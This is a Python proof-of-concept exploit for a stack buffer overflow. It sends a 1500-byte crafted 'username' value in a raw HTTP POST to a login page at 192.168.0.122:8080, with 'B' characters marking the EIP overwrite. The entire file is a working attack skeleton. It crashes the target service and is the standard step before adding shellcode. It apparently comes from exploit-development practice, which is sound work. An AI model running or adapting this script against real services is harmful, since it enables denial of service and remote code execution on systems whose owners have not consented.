#!/usr/bin/python
import socket

try:
	print("\nSending evil buffer...")
	filler = "A" * 780
	eip = "B" * 4
	offset = "C" * 4
	buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
	inputBuffer = filler + eip + offset + buffer
	content= "username=" + inputBuffer + "&password=A"
	buffer = "POST /login HTTP/1.1\r\n"
	buffer+= "Host: 192.168.0.122:8080\r\n"
	buffer+= "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
	buffer+= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http://192.168.0.122:8080/login\r\n"
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"
	buffer += content
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.0.122", 8080))
	s.send(buffer)
	s.close()
	print("\nDone!")
except:
	print("Could not connect!")
